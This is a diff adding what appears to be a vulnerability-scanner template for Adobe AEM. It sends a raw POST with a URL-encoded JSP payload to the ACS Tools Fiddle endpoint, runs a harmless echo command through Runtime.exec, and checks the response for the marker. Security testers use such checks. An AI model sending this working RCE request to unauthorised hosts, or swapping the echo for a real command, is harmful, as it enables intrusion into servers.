@@ -1,0 +1,33 @@
+id: aem-rce-on-acsTools
+
+info:
+  name: RCE on ACS Tools Fiddle
+  author: Zery
+  severity: critical
+  description: ACS Tools Fiddle is exposed, vulnerable to RCE
+  reference:
+    - https://github.com/0ang3el/aem-hacker
+  tags: aem, rce
+
+requests:
+  - raw:
+      - |-
+        POST /etc/acs-tools/aem-fiddle/_jcr_content.run.html HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: curl/13.37.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        scriptdata=%0A%3C%25%40+page+import%3D%22java.io.*%22+%25%3E%0A%3C%25+%0A%09Process+proc+%3D+Runtime.getRuntime().exec(%22echo+srtzery%22)%3B%0A%09%0A%09BufferedReader+stdInput+%3D+new+BufferedReader(new+InputStreamReader(proc.getInputStream()))%3B%0A%09StringBuilder+sb+%3D+new+StringBuilder()%3B%0A%09String+s+%3D+null%3B%0A%09while+((s+%3D+stdInput.readLine())+!%3D+null)+%7B%0A%09%09sb.append(s+%2B+%22%5C%5C%5C%5Cn%22)%3B%0A%09%7D%0A%09%0A%09String+output+%3D+sb.toString()%3B%0A%25%3E%0A%3C%25%3Doutput+%25%3E&scriptext=jsp&resource=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - srtzery
+      - type: status
+        status:
+          - 200
